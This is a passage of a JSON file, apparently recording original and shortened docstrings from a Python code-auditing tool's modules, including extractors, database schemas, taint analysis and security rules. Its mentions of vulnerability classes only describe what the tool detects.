    "truncated": "\"\"\"Extract global variable mutations (global x; x = value).\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Track variables returned from function and assigned elsewhere.\n\n        This is ADVANCED DATA FLOW: combines function_return_sources with assignment_sources\n        to find cross-function taint propagation (function A returns X → function B assigns X to Y).\n\n        One of the 7 advanced query capabilities unlocked by schema normalization.\n\n        Args:\n            function_name: Function whose return values to trace\n\n        Returns:\n            List of cross-function flow dicts with return_var, assignment_var, files, lines\n\n        Example:\n            # Track how validateUser's returns propagate\n            flows = engine.get_cross_function_taint(\"validateUser\")\n            for flow in flows:\n                print(f\"Returns {flow['return_var']} -> Assigned to {flow['assignment_var']}\")\n\n        Raises:\n            ValueError: If function_name is empty\n        \"\"\"",
    "truncated": "\"\"\"Track variables returned from function and assigned elsewhere.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Find API endpoints and their authentication controls via junction table.\n\n        Uses api_endpoint_controls junction table to show which auth mechanisms\n        protect each endpoint (JWT, session, API key, etc.).\n\n        One of the 7 advanced query capabilities unlocked by schema normalization.\n\n        Args:\n            route_pattern: Optional route pattern to filter (partial match)\n\n        Returns:\n            List of endpoint dicts with route, method, and controls list\n\n        Example:\n            # Check auth coverage for /users endpoints\n            coverage = engine.get_api_security_coverage(\"/users\")\n            for ep in coverage:\n                print(f\"{ep['method']} {ep['route']}: {len(ep['controls'])} controls\")\n\n        Raises:\n            None - gracefully returns empty list if tables missing\n        \"\"\"",
    "truncated": "\"\"\"Find API endpoints and their authentication controls via junction table.\"\"\""
  },
  {
    "file": "theauditor/graph/types.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\n    Helper to create both a FORWARD edge and a REVERSE edge.\n\n    Forward: Source -> Target (type)\n    Reverse: Target -> Source (type_reverse)\n\n    This enables backward traversal algorithms (IFDS) to navigate the graph\n    by querying outgoing edges from a sink.\n\n    Args:\n        source: Source node ID\n        target: Target node ID\n        edge_type: Type of edge (assignment, return, etc.)\n        file: File containing this edge\n        line: Line number\n        expression: Expression for this edge\n        function: Function context\n        metadata: Additional metadata dict\n\n    Returns:\n        List containing both forward and reverse edges\n    \"\"\"",
    "truncated": "\"\"\"Helper to create both a FORWARD edge and a REVERSE edge.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/rust.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract all relevant information from a Rust file.\n\n        Args:\n            file_info: File metadata dictionary with 'path', 'ext', etc.\n            content: File content\n            tree: Ignored (tree-sitter manages its own parsing)\n\n        Returns:\n            Dictionary containing all extracted data matching the 12-method interface:\n            {\n                'symbols': [...],         # Functions, structs, enums, traits\n                'imports': [...],         # use declarations\n                'exports': [...],         # pub items\n                'calls': [...],           # Function calls\n                'properties': [...],      # Field accesses\n                'assignments': [...],     # let bindings\n                'returns': [...],         # return expressions\n                'function_params': {...}, # Function parameter mapping\n                'function_calls_with_args': [...],  # Calls with arguments\n                'cfg': [...]              # Control flow graphs\n            }\n        \"\"\"",
    "truncated": "\"\"\"Extract all relevant information from a Rust file.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/graphql_schema.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\nGraphQL schema definitions - GraphQL schema, types, fields, and resolver mappings.\n\nThis module contains table schemas for GraphQL analysis:\n- Schema files and fingerprints (SDL and code-first)\n- Type definitions, fields, and arguments\n- Resolver mappings from GraphQL fields to backend symbols\n- Execution graph edges for taint and security analysis\n- Findings cache for FCE integration\n\nDesign Philosophy:\n- Language-agnostic GraphQL patterns (JavaScript, TypeScript, Python)\n- Bridges GraphQL schema layer to backend implementation\n- Enables deterministic taint flows and auth verification\n- Integrates with existing symbols table via resolver_symbol_id foreign keys\n\nThese tables are populated by:\n- GraphQL extractor (.graphql/.gql/.graphqls SDL parsing)\n- JavaScript extractor (Apollo, NestJS, TypeGraphQL resolver detection)\n- Python extractor (Graphene, Ariadne, Strawberry resolver detection)\n- GraphQL build command (execution graph construction)\n\"\"\"",
    "truncated": "\"\"\"GraphQL schema definitions - GraphQL schema, types, fields, and resolver mappings.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\n    Parse git history for commit churn, author diversity, and recency.\n\n    Delegates to existing MetadataCollector.collect_churn() for DRY compliance.\n    NOTE: Git analysis does NOT skip .venv or excluded dirs (user requirement).\n\n    Args:\n        root_path: Project root directory\n        days: Number of days to analyze (default 90)\n        file_paths: Optional list of files to filter (None = all files)\n\n    Returns:\n        Dict mapping file paths to git metrics:\n        {\n            \"auth.py\": {\n                \"commits_90d\": 23,\n                \"unique_authors\": 5,\n                \"days_since_modified\": 2,\n                \"days_active_in_range\": 45\n            }\n        }\n    \"\"\"",
    "truncated": "\"\"\"Parse git history for commit churn, author diversity, and recency.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\n    Load git churn data with author diversity and recency.\n\n    DELEGATES to intelligence.parse_git_churn() for DRY compliance.\n    Returns rich git metrics (commits, authors, recency) instead of just count.\n\n    Args:\n        file_paths: List of files to analyze\n        window_days: Number of days to analyze (default 90)\n        root_path: Project root directory\n\n    Returns:\n        Dict mapping file paths to git metrics:\n        {\n            \"auth.py\": {\n                \"commits_90d\": 23,\n                \"unique_authors\": 5,\n                \"days_since_modified\": 2,\n                \"days_active_in_range\": 45\n            }\n        }\n    \"\"\"",
    "truncated": "\"\"\"Load git churn data with author diversity and recency.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/jwt_analyze.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Detect JWT vulnerabilities using database queries with Python-side filtering.\n\n    Backend Security (Checks 1-8, 11):\n    - Hardcoded JWT secrets\n    - Weak variable-based secrets\n    - Missing expiration claims\n    - Algorithm confusion attacks\n    - None algorithm usage\n    - JWT.decode() usage (no signature verification)\n    - Sensitive data in JWT payloads\n    - Weak environment variable names\n    - Secret length < 32 characters\n\n    Frontend Security (Checks 9-10, 12-13):\n    - JWT in localStorage/sessionStorage (XSS vulnerability)\n    - JWT in URL parameters (leaks to logs/history)\n    - Cross-origin JWT transmission (CORS issues)\n    - JWT in React state (lost on refresh)\n\n    All pattern matching done in Python after database fetch.\n    File filtering handled by orchestrator via METADATA.\n    \"\"\"",
    "truncated": "\"\"\"Detect JWT vulnerabilities using database queries with Python-side filtering.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Find all taint paths from sink to sources using IFDS backward analysis.\n\n        PHASE 6.1 CHANGE (Goal B - Full Provenance):\n        Now returns (vulnerable_paths, sanitized_paths) tuple.\n\n        Algorithm (IFDS paper - demand-driven with full provenance):\n        1. Start at sink (backward analysis is demand-driven from sinks)\n        2. Query graphs.db for data dependencies (backward edges)\n        3. Follow edges backward through assignments, calls, returns, middleware\n        4. Annotate when path reaches ANY source (DO NOT terminate early)\n        5. Continue to max_depth to capture COMPLETE call chain\n        6. Build TaintPath with full hop chain (8-10 hops)\n        7. Classify path as vulnerable or sanitized based on sanitizer presence\n\n        Args:\n            sink: Security sink dict (file, line, pattern, name)\n            sources: List of taint source dicts\n            max_depth: Maximum hops (default 10)\n\n        Returns:\n            Tuple of (vulnerable_paths, sanitized_paths)\n        \"\"\"",
    "truncated": "\"\"\"Find all taint paths from sink to sources using IFDS backward analysis.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\n    Extract array from potentially wrapped data structure.\n\n    This function provides a standardized way to handle both legacy flat arrays\n    and current wrapped object formats that include metadata.\n\n    Args:\n        data: The loaded JSON data (could be dict, list, or other)\n        key: The key to look for if data is a dictionary\n        path: The file path for logging warnings\n\n    Returns:\n        The extracted list of items, or empty list if invalid format\n\n    Examples:\n        >>> extract_data_array({\"results\": [1, 2, 3]}, \"results\", \"file.json\")\n        [1, 2, 3]\n        >>> extract_data_array([1, 2, 3], \"any_key\", \"file.json\")\n        [1, 2, 3]\n        >>> extract_data_array(\"invalid\", \"key\", \"file.json\")\n        []\n    \"\"\"",
    "truncated": "\"\"\"Extract array from potentially wrapped data structure.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/__init__.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"AST Data Extraction Engine - Language-specific implementation modules.\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nThis package provides language-specific AST extraction implementations:\n\n- Python: ast_extractors/python/ - Uses CPython ast module with FileContext\n- JavaScript/TypeScript: ast_extractors/typescript_impl.py - Uses TypeScript Compiler API\n- Tree-sitter: ast_extractors/treesitter_impl.py - DEPRECATED for JS/TS\n\nCRITICAL: All extraction functions return data with 'line' numbers only.\nThe indexer layer adds file_path when storing to database.\n\nExample flow:\n  indexer/extractors/python.py:300\n    → python_impl.extract_python_functions(context)  # Direct function call\n    → python/core_extractors.py:112                  # Implementation\n    → Returns [{\"line\": 42, \"name\": \"foo\", ...}]\n\nWHY: Single source of truth for file paths, prevents architectural violations.\n\"\"\"",
    "truncated": "\"\"\"AST Data Extraction Engine - Language-specific implementation modules.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Extract if/elif/else statement patterns.\n\n    Detects:\n    - elif branches\n    - else clause\n    - Chain length (if, if-elif, if-elif-elif, etc.)\n    - Nesting level\n    - Complex conditions\n\n    Returns:\n        List of if statement dicts:\n        {\n            'line': int,\n            'has_elif': bool,\n            'has_else': bool,\n            'chain_length': int,\n            'nesting_level': int,\n            'has_complex_condition': bool,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract if/elif/else statement patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Extract extended unpacking patterns (a, *rest, b = ...).\n\n    Detects:\n    - Extended unpacking: a, *rest, b = [1, 2, 3, 4, 5]\n    - Nested unpacking: (a, (b, c)) = (1, (2, 3))\n    - List unpacking: [a, b, c] = some_list\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of unpacking pattern dicts:\n        {\n            'line': int,\n            'unpack_type': str,  # 'tuple' | 'list' | 'extended' | 'nested'\n            'target_count': int,\n            'has_rest': bool,  # True if has *rest\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract extended unpacking patterns (a, *rest, b = ...).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python_impl.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Python extraction delegation layer.\n\nThis module acts as the central coordinator for all Python extraction,\ndelegating to specialized extractors and merging their results.\n\nARCHITECTURAL ROLE\n==================\nThis is the SINGLE delegation point between:\n- python.py (the thin wrapper that builds FileContext)\n- ast_extractors/python/* (the specialized extractors)\n\nAll extraction logic flows through this file, which:\n1. Receives a FileContext from python.py\n2. Delegates to all appropriate extractors\n3. Merges and returns the unified result\n\nThis separation ensures:\n- python.py remains a thin wrapper (~150 lines)\n- Extraction logic is properly modularized\n- No duplicate extraction code\n\"\"\"",
    "truncated": "\"\"\"Python extraction delegation layer.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Rust AST extraction implementation using tree-sitter.\n\nThis module provides the 12 required extraction methods for Rust,\nmatching the interface of python_impl.py and typescript_impl.py.\n\nAll extraction is AST-based using tree-sitter-rust. NO REGEX.\n\nTree-sitter Rust Node Types:\n- function_item: fn declarations\n- struct_item: struct definitions\n- enum_item: enum definitions\n- impl_item: impl blocks\n- trait_item: trait definitions\n- use_declaration: use statements\n- let_declaration: variable bindings\n- call_expression: function calls\n- field_expression: struct.field access\n- return_expression: return statements\n- unsafe_block: unsafe { } blocks\n- macro_invocation: macro!() calls\n\"\"\"",
    "truncated": "\"\"\"Rust AST extraction implementation using tree-sitter.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Extractor framework for the indexer.\n\nThis module defines the BaseExtractor abstract class and the ExtractorRegistry\nfor dynamic discovery and registration of language-specific extractors.\n\nCRITICAL ARCHITECTURE PRINCIPLE:\nBaseExtractor provides MINIMAL string-based fallback methods for configuration\nfiles (JSON, YAML, Nginx) that lack AST parsers.\n\nLanguage extractors (Python, JavaScript) MUST use AST-based extraction.\nString/regex extraction is ONLY for:\n1. Route definitions (inherently string literals in all frameworks)\n2. SQL DDL (CREATE TABLE etc in .sql files)\n\nCRITICAL ARCHITECTURAL MANDATE: NO REGEX FOR ANYTHING ELSE. USE AST.\n\nFORBIDDEN:\n- Regex-based import extraction (use AST)\n- Regex-based SQL query extraction in code files (use AST to find db.execute() calls)\n- Regex-based JWT extraction (use AST via function_calls data)\n\"\"\"",
    "truncated": "\"\"\"Extractor framework for the indexer.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Generic configuration file extractor (Database-First Gold Standard).\n\nNuclear Option Rewrite (v1.2): Complete elimination of parser abstraction layer.\n\nThis extractor handles configuration files with DIRECT database storage:\n- Docker Compose files (docker-compose.yml) → compose_services table\n- Nginx configurations (nginx.conf) → nginx_configs table\n- Package manifests (package.json) → package_configs table\n\nARCHITECTURE:\n- Database-First: Extracts directly to database via self.db_manager\n- Zero Parsers: Inline YAML/JSON parsing, no external parser classes\n- Zero Intermediate Dicts: No 'config_data' nesting, direct DB writes\n- Zero Backward Compat: Clean slate, orphaned code eliminated\n\nReplaces:\n- compose_parser.py (deprecated)\n- nginx_parser.py (deprecated)\n- webpack_config_parser.py (deprecated)\n- Old generic.py with HAS_CUSTOM_PARSERS flag (eliminated)\n\"\"\"",
    "truncated": "\"\"\"Generic configuration file extractor (Database-First Gold Standard).\"\"\""
  },
  {
    "file": "theauditor/indexer/fidelity.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Compare extraction manifest (what was found) vs storage receipt (what was saved).\n\n    This is the core enforcement mechanism for data fidelity. It detects:\n    1. CRITICAL: Data extracted but NOTHING stored (100% loss)\n    2. WARNING: Partial mismatch (some rows filtered/duplicated)\n\n    Args:\n        manifest: Dict {table_name: count} from the extractor.\n        receipt: Dict {table_name: count} from the storage layer.\n        file_path: The file being processed (for error reporting).\n        strict: If True, raises DataFidelityError on data loss.\n\n    Returns:\n        Dict containing:\n            - status: 'OK', 'WARNING', or 'FAILED'\n            - errors: List of critical errors (100% data loss)\n            - warnings: List of partial mismatches\n\n    Raises:\n        DataFidelityError: If strict=True and data loss is detected.\n    \"\"\"",
    "truncated": "\"\"\"Compare extraction manifest (what was found) vs storage receipt (what was saved).\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Indexer orchestration logic.\n\nThis module contains the IndexerOrchestrator class that coordinates:\n- File walking and discovery\n- AST parsing and caching\n- Extractor coordination\n- Database storage (via DataStorer)\n- JSX dual-pass processing\n\nThe orchestrator implements the main indexing workflow while delegating\nspecialized concerns to focused modules (storage, extractors, database).\n\nCRITICAL SCHEMA NOTE: When adding new tables to any schema file:\n1. Add the table definition to the appropriate schema file (e.g., node_schema.py)\n2. Add storage handler to the corresponding storage file (e.g., node_storage.py)\n3. Add database method to the corresponding database file (e.g., node_database.py)\n4. Update table count in schema.py\n5. RUN: python -m theauditor.indexer.schemas.codegen\n   This regenerates generated_cache.py which taint analysis uses for memory loading!\n   WITHOUT THIS STEP, YOUR TABLE WON'T BE ACCESSIBLE TO THE ANALYZER!\n\"\"\"",
    "truncated": "\"\"\"Indexer orchestration logic.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Python storage handlers for framework-specific patterns.\n\nThis module contains handlers for Python frameworks and patterns:\n- ORM: sqlalchemy, django models, fields\n- HTTP: flask routes, django views\n- Validation: pydantic validators\n- Decorators: general Python decorators\n- Django: views, middleware\n- Consolidated tables: loops, branches, security, testing, etc.\n- Expression decomposition: comprehensions, control_statements\n\nHISTORY:\n- 2025-11-25: Reduced from 148 handlers to 7 (consolidate-python-orphan-tables)\n- 2025-11-25: Added 20 handlers for consolidated tables (wire-extractors-to-consolidated-schema)\n- 2025-11-26: Added 2 handlers for expression decomposition (Phase 2 Fidelity Control)\n\nNote: python_package_configs is stored via generic_batches in python_database.py,\nnot here - that's why we have 7 original handlers for 8 Python tables.\n\nHandler Count: 29 (7 original + 20 consolidated + 2 decomposed)\n\"\"\"",
    "truncated": "\"\"\"Python storage handlers for framework-specific patterns.\"\"\""
  },
  {
    "file": "theauditor/init.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"\n    Initialize TheAuditor for first-time use by running all setup steps.\n\n    This function handles the sequence of operations:\n    1. Index repository\n    2. Create workset\n    3. Check dependencies (unless skipped/offline)\n    4. Fetch documentation (unless skipped/offline)\n\n    Args:\n        offline: Skip network operations (deps check, docs fetch)\n        skip_docs: Skip documentation fetching\n        skip_deps: Skip dependency checking\n\n    Returns:\n        Dict containing:\n            - stats: Statistics for each step\n            - success: Overall success status\n            - has_failures: Whether any steps failed\n            - next_steps: List of recommended next commands\n    \"\"\"",
    "truncated": "\"\"\"Initialize TheAuditor for first-time use by running all setup steps.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"\n    Extract AI agent behavior features from Claude Code session logs (Tier 5).\n\n    Cross-references agent actions with repo_index.db ground truth to detect:\n    - Blind edits (editing without reading)\n    - Duplicate implementations (creating symbols that already exist)\n    - Missed context (relevant files not examined)\n    - Tool inefficiency (excessive reads/writes)\n\n    Args:\n        session_dir: Path to Claude session logs directory\n        db_path: Path to repo_index.db for cross-referencing\n        file_paths: List of files to analyze\n\n    Returns:\n        dict with keys:\n        - agent_blind_edit_count: Files edited without prior read\n        - agent_duplicate_impl_rate: Rate of duplicate symbol creation\n        - agent_missed_search_count: Relevant files not examined\n        - agent_read_efficiency: Reads per successful edit (lower = better)\n    \"\"\"",
    "truncated": "\"\"\"Extract AI agent behavior features from Claude Code session logs (Tier 5).\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Session Management Security Analyzer - Database-First Approach.\n\nDetects session and cookie security vulnerabilities using database-driven approach.\nFollows gold standard patterns from jwt_analyze.py.\n\nNO AST TRAVERSAL. NO FILE I/O. PURE DATABASE QUERIES.\n\nDetects:\n- Missing httpOnly flag on session cookies (XSS can steal sessions)\n- Missing secure flag on cookies (MITM attacks)\n- Missing SameSite attribute (CSRF attacks)\n- Session fixation vulnerabilities\n- Missing session timeout/expiration\n\nCWE Coverage:\n- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\n- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n- CWE-352: Cross-Site Request Forgery (CSRF)\n- CWE-384: Session Fixation\n- CWE-613: Insufficient Session Expiration\n\"\"\"",
    "truncated": "\"\"\"Session Management Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/fastapi_analyze.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"Detect FastAPI security vulnerabilities using indexed data.\n\n    Detects (from database):\n    - Direct database access without dependency injection\n    - Missing CORS middleware\n    - Blocking file operations (limited - can't detect async context)\n    - Raw SQL in route handlers\n    - Background tasks without proper error handling\n    - WebSocket endpoints without authentication\n    - Debug endpoints exposed\n    - Form data injection risks\n\n    Known Limitations (requires AST/type analysis):\n    - Cannot detect async functions (not stored in database)\n    - Cannot detect unvalidated path parameters (requires type hints)\n    - Cannot detect Pydantic validation usage\n    - Cannot detect middleware order\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect FastAPI security vulnerabilities using indexed data.\"\"\""
  },
  {
    "file": "theauditor/rules/security/cors_analyze.py",
    "line": -1,
    "original_lines": 21,
    "original": "\"\"\"CORS Security Analyzer - Golden Standard Implementation.\n\nDetects comprehensive CORS vulnerabilities using database-driven approach.\nFollows golden standard patterns with frozensets, proper confidence levels,\nand table existence checks.\n\nDetects 15+ real-world CORS vulnerabilities:\n- Classic wildcard with credentials\n- Subdomain wildcard takeover risks\n- Null origin bypass\n- Origin reflection without validation\n- Regex escape failures\n- Protocol downgrade attacks\n- Port confusion vulnerabilities\n- Case sensitivity bypasses\n- Cache poisoning via missing Vary header\n- Excessive preflight cache\n- WebSocket CORS bypass\n- Dynamic validation flaws\n- Framework-specific misconfigurations\n\"\"\"",
    "truncated": "\"\"\"CORS Security Analyzer - Golden Standard Implementation.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cdk_extractor.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"AWS CDK (Cloud Development Kit) Infrastructure-as-Code extractor.\n\nThis module extracts AWS CDK construct instantiations from Python code for\ninfrastructure security analysis. Supports CDK v2 only.\n\nExtracts:\n- CDK construct calls (s3.Bucket, rds.DatabaseInstance, ec2.SecurityGroup, etc.)\n- Construct properties (public_read_access, storage_encrypted, etc.)\n- Property values serialized via ast.unparse()\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'cdk_class', 'construct_name', 'properties'\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"AWS CDK (Cloud Development Kit) Infrastructure-as-Code extractor.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Extract tuple pack/unpack operations.\n\n    Detects:\n    - Tuple literals: (1, 2, 3)\n    - Tuple packing: x = 1, 2, 3\n    - Tuple unpacking: a, b, c = tuple_var\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of tuple operation dicts:\n        {\n            'line': int,\n            'operation': str,  # 'pack' | 'unpack' | 'literal'\n            'element_count': int,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract tuple pack/unpack operations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Extract truthiness patterns (implicit bool conversion).\n\n    Detects:\n    - Implicit bool: if x:\n    - Explicit bool: bool(x)\n    - Short circuit: x and y, x or y\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of truthiness dicts:\n        {\n            'line': int,\n            'pattern': str,  # 'implicit_bool' | 'explicit_bool' | 'short_circuit'\n            'expression': str,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract truthiness patterns (implicit bool conversion).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Extract container protocol implementations.\n\n    Detects:\n    - __len__, __getitem__, __setitem__, __delitem__, __contains__\n    - Sequence vs mapping distinction\n\n    Returns:\n        List of container protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_len': bool,\n            'has_getitem': bool,\n            'has_setitem': bool,\n            'has_delitem': bool,\n            'has_contains': bool,\n            'is_sequence': bool,\n            'is_mapping': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract container protocol implementations.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Search across pattern tables by security category.\n\n        NO embeddings, NO inference - direct queries on indexed pattern tables.\n        100x faster than Compass's vector similarity.\n\n        Args:\n            category: Security category (jwt, oauth, password, sql, xss, etc.)\n            limit: Maximum results per table\n\n        Returns:\n            Dict with category results from multiple tables\n\n        Example:\n            # Find all JWT usage\n            results = engine.category_search(\"jwt\")\n            # Returns: jwt_patterns, findings for JWT, symbols with JWT\n\n            # Find all authentication code\n            results = engine.category_search(\"auth\")\n        \"\"\"",
    "truncated": "\"\"\"Search across pattern tables by security category.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/__init__.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Complete database manager combining all language-specific capabilities.\n\n    This class uses multiple inheritance to combine:\n    - BaseDatabaseManager: Core infrastructure (schema, transactions, batching)\n    - 8 Mixin classes: Language-specific and domain-specific add_* methods\n\n    Method Resolution Order (MRO):\n    1. DatabaseManager (this class)\n    2. BaseDatabaseManager (core infrastructure)\n    3. CoreDatabaseMixin (21 core tables, 16 methods)\n    4. PythonDatabaseMixin (34 Python tables, 34 methods)\n    5. NodeDatabaseMixin (17 Node tables, 14 methods)\n    6. InfrastructureDatabaseMixin (18 infrastructure tables, 18 methods)\n    7. SecurityDatabaseMixin (5 security tables, 4 methods)\n    8. FrameworksDatabaseMixin (5 framework tables, 4 methods)\n    9. PlanningDatabaseMixin (5 planning tables, 0 methods - stub)\n    10. GraphQLDatabaseMixin (8 GraphQL tables, 7 methods)\n\n    Total: 116 tables, 97 methods\n    \"\"\"",
    "truncated": "\"\"\"Complete database manager combining all language-specific capabilities.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Add object literal property-function mapping to batch.\n\n        Args:\n            file_path: Path to the file containing the object literal\n            line: Line number where the object literal appears\n            variable_name: Name of the variable holding the object (e.g., 'handlers')\n            property_name: Key in the object literal (e.g., 'create')\n            property_value: Value expression (e.g., 'handleCreate' or '{nested}')\n            property_type: Type of value - one of:\n                - 'function_ref': Reference to a function (e.g., handleCreate)\n                - 'literal': Primitive literal value (string, number, boolean)\n                - 'expression': Complex expression\n                - 'object': Nested object literal\n                - 'method_definition': ES6 method syntax (method() {})\n                - 'shorthand': Shorthand property ({ handleClick })\n                - 'arrow_function': Inline arrow function\n                - 'function_expression': Inline function expression\n            nested_level: Depth of nesting (0 = top level, 1 = first nested, etc.)\n            in_function: Name of containing function ('' for module scope)\n        \"\"\"",
    "truncated": "\"\"\"Add object literal property-function mapping to batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/planning_database.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"Mixin providing add_* methods for PLANNING_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n\n    PLANNING TABLES (9 tables - Eric's Framework Integration):\n    - plans: Main planning table (id, name, description, status, metadata)\n    - plan_phases: Phase hierarchy (plan_id FK, phase_number, success_criteria) [NEW]\n    - plan_tasks: Tasks within phases (plan_id FK, phase_id FK, task_number, audit_status)\n    - plan_jobs: Checkbox items (task_id FK, job_number, completed, is_audit_job) [NEW]\n    - plan_specs: Specs for plans (plan_id FK, spec_yaml, spec_type)\n    - code_snapshots: Code snapshots/checkpoints (plan_id FK, task_id FK, checkpoint_name, git_ref)\n    - code_diffs: Diffs between snapshots (snapshot_id FK, file_path, diff_text, line counts)\n    - refactor_candidates: Files flagged for refactoring (file_path, reason, severity, metrics)\n    - refactor_history: Refactor execution history (timestamp, target_file, migrations)\n\n    ERIC'S FRAMEWORK METHODS:\n    - add_plan_phase() - Create phase with \"Success Criteria\" field\n    - add_plan_job() - Add checkbox item to task with audit flag\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for PLANNING_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 20,
    "original": "\"\"\"GitHub Actions workflow extractor - Database-First Architecture.\n\nExtracts CI/CD workflow definitions from .github/workflows/*.yml files.\nNO security checks (that's what rules do).\nNO separate parser class (inline parsing).\n\nFollows gold standard: Facts only, direct DB writes, no intermediate dicts.\n\nARCHITECTURE:\n- Database-First: Extracts directly to database via self.db_manager\n- Zero Fallbacks: NO try/except around schema operations, hard fail on errors\n- Inline YAML: Uses yaml.safe_load() directly, no parser abstraction\n- Config File Pattern: Follows docker/compose precedent (not terraform/HCL)\n\nExtracted data:\n- Workflows: name, triggers, permissions, concurrency\n- Jobs: dependencies (needs:), matrix strategy, permissions\n- Steps: actions, run scripts, env vars, with args\n- References: ${{ }} expressions (github.*, secrets.*, etc.)\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions workflow extractor - Database-First Architecture.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript.py",
    "line": -1,
    "original_lines": 20,
